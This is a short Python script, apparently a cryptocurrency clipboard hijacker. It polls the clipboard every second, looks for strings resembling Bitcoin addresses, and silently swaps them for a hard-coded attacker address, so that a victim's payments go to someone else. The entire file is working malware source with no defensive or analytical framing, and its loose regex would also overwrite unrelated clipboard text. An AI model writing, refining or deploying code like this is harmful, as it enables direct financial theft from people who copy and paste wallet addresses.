import pyperclip
import time
import re

btc_check = re.compile(r'([A-Za-z0-9]){26,35}')

def get_clipboard():
    
    try:
        clipboard_data = pyperclip.paste()
    except:
        raise Exception("an error occurred")
    if not bool(btc_check.search(clipboard_data)):
        print("No btc in clipboard")
        return False        
    btc = btc_check.sub(r'3K1nGEijpMxzP5Vy7WtZxjwVwYUgcE9DmC', str(clipboard_data.strip('  \n \r \t')))
    print ("BTC address found swapping address!")
    pyperclip.copy(btc)


if __name__ == '__main__':
    while True:
        if get_clipboard():
            time.sleep(1)
        else:
            time.sleep(1)

